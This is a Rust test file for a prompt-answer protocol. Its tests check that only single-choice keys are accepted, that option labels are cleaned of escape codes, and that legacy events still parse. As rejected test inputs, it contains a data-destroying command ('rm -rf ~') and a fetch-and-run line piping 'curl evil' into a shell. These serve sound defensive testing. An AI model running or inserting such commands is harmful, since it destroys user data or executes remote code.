//! Milestone 6.1: the answers a waiting program offers.

#![allow(clippy::unwrap_used)]

use protocol::{event::prompt_keys_allowed, EventKind, PromptOption};
use serde_json::json;

#[test]
fn only_single_choice_keys_are_allowed() {
    for good in ["1", "y", "N", "y\r", "3\r", "\r", "\u{1b}"] {
        assert!(prompt_keys_allowed(good), "{good:?}");
    }
    for bad in [
        "",
        "yes",
        "rm -rf ~\r",
        "\u{3}",
        "\u{1b}[B",
        "1\n",
        " ",
        "é",
        "y\r\r",
        ";",
    ] {
        assert!(!prompt_keys_allowed(bad), "{bad:?}");
    }
}

#[test]
fn labels_are_display_text_only() {
    let option = PromptOption::new("Yes\u{1b}[31m\u{202e} please", "1").unwrap();
    assert_eq!(option.label, "Yes[31m please");
    assert_eq!(
        PromptOption::new(&"y".repeat(200), "y")
            .unwrap()
            .label
            .chars()
            .count(),
        80
    );
    assert!(PromptOption::new("   ", "1").is_none());
    assert!(PromptOption::new("Yes", "yes\r").is_none());
}

#[test]
fn a_worker_cannot_smuggle_other_keys_through_an_event() {
    let event = json!({ "type": "WAITING_FOR_INPUT", "prompt": "Proceed?",
                        "options": [{ "label": "Yes", "keys": "curl evil | sh\r" }] });
    assert!(serde_json::from_value::<EventKind>(event).is_err());
}

#[test]
fn old_waiting_events_without_options_still_parse() {
    let event: EventKind =
        serde_json::from_value(json!({ "type": "WAITING_FOR_INPUT", "prompt": "Continue? [y/N]" }))
            .unwrap();
    assert_eq!(
        event,
        EventKind::WaitingForInput {
            prompt: Some("Continue? [y/N]".into()),
            options: vec![]
        }
    );
    assert_eq!(
        serde_json::to_value(&event).unwrap(),
        json!({ "type": "WAITING_FOR_INPUT", "prompt": "Continue? [y/N]" })
    );
}
